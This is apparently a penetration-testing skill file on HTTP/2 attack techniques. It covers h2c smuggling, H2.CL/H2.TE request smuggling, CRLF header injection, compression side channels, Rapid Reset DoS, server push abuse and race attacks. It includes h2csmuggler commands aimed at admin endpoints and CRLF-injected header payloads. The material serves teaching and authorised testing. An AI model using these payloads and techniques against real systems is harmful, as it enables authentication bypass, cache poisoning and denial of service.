---
name: http2-vulnerabilities
description: HTTP/2 specific vulnerabilities — h2c smuggling, rapid reset DoS, header injection, and protocol downgrade attacks
---

# HTTP/2 Vulnerabilities

HTTP/2 introduces new attack surfaces beyond HTTP/1.1: multiplexed streams, header compression (HPACK), binary framing, and h2c (cleartext) upgrades. These enable novel smuggling variants, DoS through rapid stream reset, and information disclosure via compression side channels.

## HTTP/2 Architecture

```
HTTP/2 features:
- Binary framing layer (not text-based like HTTP/1.1)
- Multiplexed streams (multiple requests per connection)
- Header compression via HPACK
- Server push
- Stream prioritization
- h2c: HTTP/2 over cleartext (for internal services)
- h2: HTTP/2 over TLS
```

## h2c Smuggling (HTTP/2 Cleartext Upgrade)

When a front-end proxy strips the `Upgrade: h2c` header but the backend processes it:

```
# Send to front-end (load balancer/reverse proxy):
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

# Front-end strips Upgrade header, forwards as HTTP/1.1
# If backend directly supports h2c, it upgrades
# Attacker now has a direct HTTP/2 connection to backend
# Bypasses front-end security controls (auth, WAF, ACL)
```

**h2c Smuggling to bypass auth**
```bash
# Tool: h2csmuggler
h2csmuggler.py --smuggle -x https://target.com/admin \
  -H "Transfer-Encoding: chunked" \
  "GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n"

# Direct h2c request to internal service:
curl --http2-prior-knowledge http://internal-service:8080/admin
```

## HTTP/2 Request Smuggling (H2.CL and H2.TE)

HTTP/2 downgraded to HTTP/1.1 by reverse proxy creates smuggling opportunities:

### H2.CL (Content-Length injection via HTTP/2)

```
# HTTP/2 request (pseudo-headers):
:method POST
:path /
:scheme https
:authority target.com
content-length: 0

# HTTP/2 allows injecting content-length — proxy may forward as HTTP/1.1 with that CL
# Exploit: send request where HTTP/2 layer disagrees with HTTP/1.1 CL forwarded by proxy
```

### H2.TE (Transfer-Encoding injection via HTTP/2)

```
# HTTP/2 forbids Transfer-Encoding but some proxies forward it
# Inject TE: chunked in HTTP/2 headers → proxy forwards → backend processes as chunked
# Classic TE.CL or CL.TE smuggling via HTTP/2
```

### Header Injection via HTTP/2

```
# HTTP/2 request headers are binary — some proxies fail to sanitize newlines
# Inject CRLF via HTTP/2 header value → forwarded to backend with injected header
:path /foo HTTP/1.1\r\nTransfer-Encoding: chunked\r\n

# Header name injection
foo: bar\r\nX-Injected: value
```

## HPACK Compression Side Channel (CRIME/BREACH)

```
# CRIME (CVE-2012-4929) — TLS compression oracle (now largely mitigated)
# BREACH — HTTP response body compression oracle
# HEIST — HTTPS response length via HTTP/2 server push timing

# If HTTP/2 + response body compression (gzip):
# Attacker can probe compressed response length
# Infer secret tokens character by character based on compression ratio
# (Well-known secrets like CSRF tokens that appear in response body)
```

## Rapid Reset DoS (CVE-2023-44487)

```
# Attacker sends large number of HEADERS frames immediately followed by RST_STREAM
# Each stream starts processing before being cancelled
# Multiplexing allows 100+ streams per connection
# Server processes requests, allocates resources, then must cancel
# Can overwhelm server with minimal bandwidth

# Detection: server sending GOAWAY frames with ENHANCE_YOUR_CALM error
# Impact: major CDNs and web servers affected (nginx, Apache, IIS)
# Mitigation: rate limiting on streams, max concurrent streams settings
```

## Server Push Abuse

```
# If server push is enabled and attacker can control pushed URLs
# Via Link: </resource>; rel=preload header reflected from user input
# Attacker pushes: sensitive resources to victim's cache
# Or: exfiltrates data via server push to attacker-controlled stream

# Test: inject Link header with rel=preload pointing to sensitive resource
Link: </admin/secret>; rel=preload; as=fetch
```

## Stream Multiplexing Attacks

```
# Race conditions amplified by HTTP/2 multiplexing
# Send N parallel requests in one TCP connection:
# - Parallel login attempts (N-times more efficient brute force)
# - Parallel IDOR probes
# - Race condition exploitation (same window, more precision)

# Tool: Turbo Intruder (Burp) in single-packet attack mode
# HTTP/2 allows all requests in one packet → no timing difference
```

## HTTP/2 ALPN/SNI Attacks

```
# SNI (Server Name Indication) in TLS ClientHello
# ALPN (Application-Layer Protocol Negotiation)

# If application selects different code path based on ALPN:
# h2 → different handlers than http/1.1
# Possible: access h2-only internal endpoints by negotiating h2 ALPN
```

## Protocol Confusion

```
# Some proxies upgrade HTTP/1.1 to HTTP/2 internally
# Mismatch in header handling (pseudo-headers vs regular headers)
# :method, :path, :scheme, :authority — if these can be injected in HTTP/1.1...
X-HTTP-Method-Override: :INJECTED_METHOD
```

## Testing Methodology

1. **Detect HTTP/2 support** — `curl --http2 -I https://target.com`
2. **Check h2c support** — `curl --http2-prior-knowledge http://target.com`
3. **Test h2c smuggling** — h2csmuggler to access internal endpoints
4. **Test H2.CL/H2.TE** — Use Burp Suite HTTP/2 inspector with Turbo Intruder
5. **Check response compression** — `Accept-Encoding: gzip` + measure response length changes
6. **Test server push** — Can you inject Link: header that triggers push?
7. **Test rapid reset** — Measure server behavior under rapid HEADERS+RST_STREAM
8. **Single-packet attacks** — Use HTTP/2 multiplexing for race condition testing

## Tools

```bash
# curl (HTTP/2 support)
curl --http2 https://target.com
curl --http2-prior-knowledge http://target.com

# h2csmuggler
pip install h2csmuggler
h2csmuggler.py -x https://target.com/admin/

# Burp Suite
# HTTP/2 is natively supported in Burp 2021.2+
# Inspector pane shows HTTP/2 pseudo-headers
# Turbo Intruder supports HTTP/2 single-packet attacks

# nghttp2 tools
nghttp -v https://target.com  # Verbose HTTP/2 session

# h2spec (H2 spec compliance testing)
h2spec -h target.com -p 443 -t
```

## Validation

1. For h2c smuggling: show request to restricted endpoint bypassing authentication
2. For H2.CL/H2.TE: show classic smuggling impact (prefix injection to victim response)
3. For server push: show pushed content in victim's browser cache
4. For rapid reset: show CPU/memory spike with tool output

## False Positives

- h2c not supported on backend (only front-end h2)
- Proxy strips Upgrade header as designed
- Content-Length in HTTP/2 not forwarded by proxy
- Request smuggling mitigated by proxy normalization

## Impact

- h2c smuggling: WAF/auth bypass, access to internal services
- Request smuggling: cache poisoning, session hijacking, request queue poisoning
- Rapid reset: DoS of HTTP/2-enabled servers
- Side channel: CSRF token leakage via compression oracle

## Pro Tips

1. Burp's HTTP/2 support is essential for modern testing — always upgrade to latest
2. `h2c` on internal/backend services is common — front-end handles TLS, backend uses h2c
3. Single-packet attacks via HTTP/2 multiplexing give better race condition timing than HTTP/1.1
4. Check if proxy rewrites HTTP/1.1 to HTTP/2 internally — creates H2.CL/H2.TE surface
5. Rapid reset (CVE-2023-44487) is usually low-hanging in self-hosted HTTP/2 servers without patching
6. HTTP/2 server push + XSS = cache poisoning of pushed resources

## Summary

HTTP/2's efficiency features — multiplexing, binary framing, header compression — introduce new attack primitives. h2c smuggling bypasses front-end controls, request smuggling persists through H2→H1 downgrade, and multiplexing enables precise race conditions. Test both the h2 (TLS) and h2c (cleartext) surfaces on internal services.
